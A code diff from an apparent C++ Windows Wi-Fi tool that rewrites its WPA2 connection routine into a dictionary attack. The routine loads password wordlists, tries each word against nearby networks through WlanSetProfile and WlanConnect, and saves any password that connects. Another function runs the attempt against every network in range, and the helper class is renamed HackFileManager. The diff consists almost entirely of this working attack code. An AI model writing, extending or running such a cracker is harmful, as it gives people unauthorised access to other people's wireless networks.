@@ -23,7 +23,7 @@ void WlanApiWrapper::scanEntries()
 
 void WlanApiWrapper::connectToAll()
 {
-	scanEntries();
+	ensureEntries();
 
 	std::for_each(std::begin(*entries), std::end(*entries), [this](WLAN_AVAILABLE_NETWORK network_entry) {
 
@@ -51,14 +51,14 @@ void WlanApiWrapper::connectToAll()
 
 void WlanApiWrapper::connect(std::string ssid)
 {
-	scanEntries();
+	ensureEntries();
 
 	const auto network = std::find_if(std::begin(*entries), std::end(*entries), [ssid](WLAN_AVAILABLE_NETWORK entry) {
 		return strcmp(reinterpret_cast<char*>(entry.dot11Ssid.ucSSID), ssid.c_str()) == 0;
 	});
 
 	if (network == std::end(*entries)) {
-		std::cout << "Cannot connect to " << ssid << "break.";
+		std::cout << "Cannot find entry " << ssid << "break.";
 		return;
 	}
 
@@ -88,56 +88,70 @@ std::string * WlanApiWrapper::connect_to_rsnapsk(WLAN_AVAILABLE_NETWORK entry)
 	const std::string authentication = "WPA2PSK";
 	const std::string ssid = static_cast<std::string>(reinterpret_cast<char*>(entry.dot11Ssid.ucSSID));
 
-	auto profile_xml = profile_helper->get_profile_xml(ssid, authentication, "AES", "UKR_5532_");
+	auto file_paths = pass_manager->getDictionaryFilePaths();
 
-	//need because setProfile uses prfile_xml in unicode.
-	const auto wprofile_xml = StringHelper::convertStringToWString(profile_xml);
+	for (auto path : *file_paths) {
+		const auto passwords = pass_manager->getWordsFromDictionary(path);
 
-	DWORD reasonCode;
-	const auto set_profile_result = WlanSetProfile(wlan_client, &wlan_interface_info->InterfaceGuid, 0, (*wprofile_xml).c_str(), nullptr, true, nullptr, &reasonCode);
-	error_wrapper->wrapSetProfileResult(set_profile_result, reasonCode);
+		for (auto pass : *passwords) {
+			auto profile_xml = profile_helper->get_profile_xml(ssid, authentication, "AES", pass);
 
-	WLAN_CONNECTION_PARAMETERS params = {};
+			//need because setProfile uses prfile_xml in unicode.
+			const auto wprofile_xml = StringHelper::convertStringToWString(profile_xml);
 
-	/*params.wlanConnectionMode = wlan_connection_mode_discovery_secure;
-	params.strProfile = (LPCWSTR)(*wprofile_xml).c_str();
-	params.pDot11Ssid = &entry.dot11Ssid;
+			DWORD reasonCode;
+			const auto set_profile_result = WlanSetProfile(wlan_client, &wlan_interface_info->InterfaceGuid, 0, (*wprofile_xml).c_str(), nullptr, true, nullptr, &reasonCode);
+			
+			if (!error_wrapper->wrapSetProfileResult(set_profile_result, reasonCode)) {
+				std::cout << "Cannot set profile. Continue trying...";
+				continue;
+			}
 
-	params.pDesiredBssidList = 0;
-	params.dot11BssType = entry.dot11BssType;
-	params.dwFlags = WLAN_CONNECTION_PERSIST_DISCOVERY_PROFILE;*/
+			WLAN_CONNECTION_PARAMETERS params = {};
 
-	params.wlanConnectionMode = wlan_connection_mode_profile;
+			/*params.wlanConnectionMode = wlan_connection_mode_discovery_secure;
+			params.strProfile = (LPCWSTR)(*wprofile_xml).c_str();
+			params.pDot11Ssid = &entry.dot11Ssid;
 
-	const std::string strProfile((char*)entry.dot11Ssid.ucSSID);
-	const auto wStrProfile = StringHelper::convertStringToWString(strProfile);
+			params.pDesiredBssidList = 0;
+			params.dot11BssType = entry.dot11BssType;
+			params.dwFlags = WLAN_CONNECTION_PERSIST_DISCOVERY_PROFILE;*/
 
-	params.strProfile = (LPCWSTR)(*wStrProfile).c_str();
-	params.pDot11Ssid = &entry.dot11Ssid;
+			params.wlanConnectionMode = wlan_connection_mode_profile;
 
-	params.pDesiredBssidList = 0;
-	params.dot11BssType = entry.dot11BssType;
-	params.dwFlags = 0;
-	
+			const std::string strProfile((char*)entry.dot11Ssid.ucSSID);
+			const auto wStrProfile = StringHelper::convertStringToWString(strProfile);
 
-	auto connectResult = WlanConnect(wlan_client, &wlan_interface_info->InterfaceGuid, &params, nullptr);
+			params.strProfile = (LPCWSTR)(*wStrProfile).c_str();
+			params.pDot11Ssid = &entry.dot11Ssid;
 
-	//check interface info isState property to connection mode. If connected, so write to file.
-	if (!error_wrapper->wrapConnectResult(connectResult))
-		return nullptr;
+			params.pDesiredBssidList = 0;
+			params.dot11BssType = entry.dot11BssType;
+			params.dwFlags = 0;
 
-	//update the interface in order to inteligently check 'isState'.
-	if (!trySetWlanInterfaceInfo())
-	{
-		std::cout << "Cannot update wlan interface." << std::endl;
-		return nullptr;
+			auto connectResult = WlanConnect(wlan_client, &wlan_interface_info->InterfaceGuid, &params, nullptr);
+
+			//check interface info isState property to connection mode. If connected, so write to file.
+			if (!error_wrapper->wrapConnectResult(connectResult))
+				continue;
+
+			//update the interface in order to inteligently check 'isState'.
+			if (!trySetWlanInterfaceInfo())
+			{
+				std::cout << "Cannot update wlan interface." << std::endl;
+				return nullptr;
+			}
+
+			if (wlan_interface_info->isState == wlan_interface_state_connected) {
+				pass_manager->savePassword(ssid, pass);
+				return new std::string(ssid + " " + pass);
+			}
+		}
+
+		delete passwords;
 	}
 
-	if (wlan_interface_info->isState == wlan_interface_state_connected) {
-		pass_manager->savePassword(ssid, "123");
-	}
-
-	return new std::string(ssid + " " + "123123123");
+	delete file_paths;
 }
 
 bool WlanApiWrapper::trySetWlanClient()
@@ -194,7 +208,7 @@ WlanApiWrapper::WlanApiWrapper()
 
 	profile_helper = new ProfileHelper();
 	error_wrapper = new WlanApiErrorWrapper();
-	pass_manager = new PasswordManager();
+	pass_manager = new HackFileManager();
 
 	const auto init_result = trySetWlanClient();
 
